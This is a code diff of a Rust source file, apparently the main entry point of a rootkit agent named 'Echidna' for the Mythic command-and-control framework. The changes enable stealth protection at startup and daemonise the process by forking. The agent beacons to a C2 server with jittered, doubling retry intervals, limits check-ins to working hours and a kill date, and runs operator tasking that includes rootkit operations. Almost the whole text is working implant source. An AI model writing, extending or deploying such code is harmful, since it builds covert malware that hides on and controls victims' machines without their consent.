@@ -1,4 +1,3 @@
-
 use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime};
 use chrono::Duration;
 use std::error::Error;
@@ -14,19 +13,27 @@ mod rootkit;
 mod stealth;
 mod tasking;
 mod utils;
-mod commands;
 
+// Echidna-specific rootkit commands and minimal system control
+mod commands;
+mod exit;
+mod jobs;
+mod sleep;
+mod workinghours;
+
+/// Real entrypoint of the program.
+/// Checks to see if the agent should daemonize and then runs the main beaconing code.
 pub fn real_main() -> Result<(), Box<dyn Error>> {
-    // initialize stealth measures 
-    // stealth::initialize_protection()?;
+    // Initialize stealth measures early
+    stealth::initialize_protection()?;
 
     if let Some(daemonize) = option_env!("daemonize") {
         if daemonize.eq_ignore_ascii_case("true") {
-            // fork the process if daemonize is set to "true"
-            #[cfg(target_os) = "linux"]
+            // Fork the process if daemonize is set to "true"
             if unsafe { libc::fork() } == 0 {
                 run_beacon()?;
             }
+            return Ok(());
         }
     }
 
@@ -35,94 +42,110 @@ pub fn real_main() -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-fun run_beacon() -> Result<(), Box<dyn Error>> {
-    // create a new Echidna agent object
+/// Main code which runs the Echidna rootkit agent
+fn run_beacon() -> Result<(), Box<dyn Error>> {
+    // Create a new Echidna agent object
     let mut agent = EchidnaAgent::new();
 
-    // get the initial interval from the config
+    // Get the initial interval from the config
     let mut interval = payloadvars::callback_interval();
 
-    // set the number of checkin retries
+    // Set the number of checkin retries
     let mut tries = 1;
 
-    // keep trying to reconnect to the C2 if the connection is unavailable
+    // Keep trying to reconnect to the C2 if the connection is unavailable
     loop {
-        // get current time
+        // Get the current time
         let now: DateTime<Local> = std::time::SystemTime::now().into();
         let now: NaiveDateTime = now.naive_local();
 
-        // get the configured start and end working hours for beaconing
+        // Get the configured start working hours for beaconing
         let working_start = NaiveDateTime::new(now.date(), payloadvars::working_start());
+
+        // Get the configured end working hours for beaconing
         let working_end = NaiveDateTime::new(now.date(), payloadvars::working_end());
 
-        // check the agent's working hours and don't check in if not in the defined time frame
+        // Check the agent's working hours and don't check in if not in the configured time frame
         if now < working_start {
-            let delta = Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
+            let delta =
+                Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
+            std::thread::sleep(delta.to_std()?);
+        } else if now > working_end {
+            let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
+            let delta =
+                Duration::seconds(next_start.and_utc().timestamp() - now.and_utc().timestamp());
             std::thread::sleep(delta.to_std()?);
         }
 
-        // check if agent has passed the kill date
+        // Check if the agent has passed the kill date
         if now.date() >= NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d")? {
+            // Clean up any active rootkit techniques before exiting
             if let Err(e) = agent.cleanup_rootkit() {
                 eprintln!("Warning: Failed to clean up rootkit techniques: {}", e);
             }
             return Ok(());
         }
 
-        // try to make the initial checkin to Mythic, if this succeeds then break loop
+        // Try to make the initial checkin to the C2, if this succeeds the loop will break
         if agent.make_checkin().is_ok() {
             break;
         }
 
-        // check if number of connection attempts equals the configured connection attempts
+        // Check if the number of connection attempts equals the configured connection attempts
         if tries >= payloadvars::retries() {
             return Ok(());
         }
 
-        // calculate the sleep time and sleep the agent
+        // Calculate the sleep time and sleep the agent
         let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
         std::thread::sleep(std::time::Duration::from_secs(sleeptime));
 
+        // Increment the current attempt
         tries += 1;
-        // double current set interval for next connection attempt
-        interval *= 2;
-    } // checkin successful
 
-    // main agent loop
+        // Double the currently set interval for next connection attempt
+        interval *= 2;
+    } // Checkin successful
+
+    // Main agent loop
     loop {
-        // refresh stealth measures periodically
+        // Refresh stealth measures periodically
         stealth::refresh_protection()?;
-        
-        // get new tasking from Mythic
+
+        // Get new tasking from Mythic
         let pending_tasks = agent.get_tasking()?;
 
-        // process the pending tasks
+        // Process the pending tasks (including rootkit-specific commands)
         agent
             .tasking
             .process_tasks(pending_tasks.as_ref(), &mut agent.shared)?;
 
+        // Sleep the agent
         agent.sleep();
 
-        // get completed task information and send to Mythic server
+        // Get the completed task information
         let completed_tasks = agent.tasking.get_completed_tasks()?;
+
+        // Send the completed tasking information up to Mythic
         let continued_tasking = agent.send_tasking(&completed_tasks)?;
 
-        // pass along any continued tasks
+        // Pass along any continued tasking (download, upload, rootkit operations, etc.)
         agent
             .tasking
             .process_tasks(continued_tasking.as_ref(), &mut agent.shared)?;
-        
-        // break out of loop if the agent exits
+
+        // Break out of the loop if the agent should exit
         if agent.shared.exit_agent {
+            // Clean up any active rootkit techniques before exiting
             if let Err(e) = agent.cleanup_rootkit() {
                 eprintln!("Warning: Failed to clean up rootkit techniques: {}", e);
             }
             break;
         }
 
+        // Sleep the agent
         agent.sleep();
     }
 
     Ok(())
 }
-
